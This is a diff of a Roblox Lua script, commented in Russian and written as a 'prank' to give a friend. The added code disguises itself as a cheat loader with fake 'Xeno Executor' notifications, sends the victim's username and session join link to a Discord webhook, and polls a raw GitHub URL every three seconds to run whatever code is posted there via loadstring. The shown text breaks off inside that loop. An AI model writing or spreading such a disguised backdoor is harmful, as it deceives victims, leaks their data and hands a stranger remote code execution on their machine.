@@ -1,35 +1,57 @@
+-- === СКРИПТ ДЛЯ ДРУГА (НА ГИТХАБ) ===
 local httpRequest = (syn and syn.request) or (http and http.request) or request
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- 1. Ссылка на ваш логгер в Discord
-local discordWebhook = "https://discord.com"
-local uriJoinLink = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+-- Ссылка на ваш логгер в Discord
+local discordWebhook = "https://lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU"
 
-local payload = {["content"] = "🎯 **Пранк запущен!**\n👤 **Ник друга:** " .. player.Name .. "\n```" .. uriJoinLink .. "```"}
+-- Собираем данные и URI-ссылку сессии
+local placeId = game.PlaceId
+local jobId = game.JobId
+local uriJoinLink = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId
+
+local payload = {
+    ["content"] = "🎯 **Пранк успешно активирован!**\n" ..
+                  "👤 **Ник друга:** " .. player.Name .. "\n" ..
+                  "🎮 **ID Плейса:** " .. tostring(placeId) .. "\n\n" ..
+                  "👇 **Скопируйте строку ниже и вставьте в окно Win+R:**\n" ..
+                  "```" .. uriJoinLink .. "```"
+}
+
+-- Отправка уведомления вам в Discord
 if httpRequest then
-    httpRequest({Url = discordWebhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
+    httpRequest({
+        Url = discordWebhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
 end
 
--- Маскировка под запуск чита
+-- Красивая имитация загрузки чита
 pcall(function()
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Xeno Executor", Text = "Script Loaded Successfully!", Duration = 3})
+    local sg = game:GetService("StarterGui")
+    sg:SetCore("SendNotification", {Title = "Xeno Executor", Text = "Checking Whitelist...", Duration = 2})
+    task.wait(2)
+    sg:SetCore("SendNotification", {Title = "Xeno Executor", Text = "Bypassing Anticheat [1/2]...", Duration = 2})
+    task.wait(2)
+    sg:SetCore("SendNotification", {Title = "Xeno Executor", Text = "Script Loaded Successfully!", Duration = 3})
 end)
 
--- 2. ССЫЛКА НА ВАШ ФАЙЛ КОМАНД (Вставьте сюда вашу RAW ссылку на command.lua)
-local commandUrl = "https://githubusercontent.com"
-
+-- ПУТЬ К ВАШЕМУ ФАЙЛУ КОМАНД (Убедитесь, что ник kazzqa и репозиторий верные)
+local commandUrl = "https://raw.githubusercontent.com/kazzqa/executable-script/refs/heads/main/command"
 local lastCommandCode = ""
 
--- Бесконечный цикл, который проверяет команды в фоне
+-- Цикл проверки команд в фоне
 task.spawn(function()
     while task.wait(3) do
         local success, currentCode = pcall(function()
             return game:HttpGet(commandUrl)
         end)
         
-        -- Если код на гитхабе изменился и он не пустой — выполняем его!
+        -- Если на GitHub появился новый код — запускаем его
         if success and currentCode and currentCode ~= "" and currentCode ~= lastCommandCode then
             lastCommandCode = currentCode
             local runCode = loadstring(currentCode)
